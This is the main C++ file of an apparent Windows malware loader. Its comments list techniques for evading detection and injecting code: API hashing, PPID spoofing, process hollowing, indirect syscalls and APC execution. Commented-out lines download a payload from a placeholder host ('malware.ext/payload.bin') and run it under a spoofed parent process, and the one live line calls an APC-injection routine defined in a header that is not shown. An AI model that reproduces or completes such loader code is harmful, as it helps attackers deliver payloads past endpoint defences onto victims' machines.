#include <Windows.h>
#include <winhttp.h>
#include <iostream>
#include "Ven.h"



int main()
{
    // Compile Time API Hashing
    // Run-Time Dynamic Linking 
    // PPID spoofing
    // Process hollowing
    // Indirect syscalls execution
    // APC execution




    // Get spoolsv PID for PPI spoofing
    // DWORD pid = GetPID();

    // For payload download 
    // std::vector<BYTE> sh = Download(L"malware.ext\0", L"/payload.bin\0");

    // For synchronous payload execution with PPID spoofing
    // raw_exec_ppid(sh, pid);




    // For APC execution with indirect syscalls
    IndirectAPC();



}